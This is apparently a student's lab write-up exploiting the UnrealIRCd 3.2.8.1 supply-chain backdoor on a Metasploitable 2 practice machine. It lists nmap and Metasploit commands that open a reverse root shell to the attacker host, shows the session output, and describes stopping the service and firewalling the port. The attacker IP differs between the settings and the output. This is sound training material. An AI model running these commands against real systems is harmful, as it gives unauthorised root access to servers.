# 10 — UnrealIRCd Backdoor (CVE-2010-2075)

## Environment
- Attacker: Kali Linux 192.168.56.102
- Target: Metasploitable 2 192.168.56.101
- Date: 18 May 2026
- Port: 6667
- CVE: CVE-2010-2075

## Overview
Exploited a backdoor deliberately planted in UnrealIRCd 
3.2.8.1 by an attacker who compromised the official download 
server between November 2009 and June 2010. Anyone who 
downloaded the software during that period was running a 
backdoored IRC server without knowing it. This is a classic 
supply chain attack.

## Tools
msfconsole, nmap

## Commands

```bash
nmap -p 6667 --script irc-info 192.168.56.101

use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set payload cmd/unix/reverse
run
```

## Output

```text
[*] Started reverse TCP double handler on 192.168.56.103:4444
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.56.101:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 1sL5y0DxbF33rPDo;
[*] Command shell session 1 opened
    (192.168.56.103:4444 -> 192.168.56.101:58089)
    at 2026-05-19 00:53:44 -0400
```

## Findings
UnrealIRCd 3.2.8.1 confirmed running. The backdoor triggered 
instantly and opened a root shell. This required no 
credentials and no vulnerability in our own setup — the 
malicious code was baked into the software itself.

## Defense Applied

Stopped the UnrealIRCd service:

```bash
/etc/init.d/unrealircd stop
```

Blocked port 6667 at the firewall:

```bash
iptables -A INPUT -p tcp --dport 6667 -j DROP
```

Verified exploit no longer worked after blocking.

## What I Learned
Supply chain attacks are among the most dangerous threats 
in cybersecurity because you trust the official source. 
Always verify software checksums before deploying. Every 
unnecessary service running on a server is an additional 
risk — if you do not need it, disable it.
